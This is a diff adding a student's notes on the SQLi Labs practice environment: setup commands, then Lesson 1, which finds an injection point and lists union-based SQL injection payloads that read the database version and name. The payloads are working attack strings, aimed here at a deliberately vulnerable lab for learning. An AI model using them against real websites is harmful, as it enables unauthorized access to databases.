@@ -1,2 +1,22 @@
-Set1 
-Challenge-1
+#SQLi Labs
+First we have to set up sqli labs
+For that we can use the following commands
+install apache2 webserver by > sudo apt install apache2
+install mysql by > sudo apt-get install mysql-srver
+install php7
+git clone the repository of the lab and start all the services.
+
+#LESS1
+The website says,Please input the ID as parameter with numeric value.
+So we can input ?id=1 or 2,3,4,5.....
+when we put ' we get sql error 
+thus we have a sql injection
+we can comment ou the rest of the query by -- - or other comments in sql language.
+
+ payloads to dump
+ We can get version of the server by using /?id=-1' union select 1,version(),3--+
+ We can get databasename of the server by using /?id=-1' union select 1,database(),3--+  databasename = security
+ Going to the terminal and going to mysql. If we type show databases; it shows databases
+ Then we can security also. We can find more details using "use security we can go into the database.
+ Using show tables; we can see the tables. For looking into the tables desc emails; and so on...
+ 
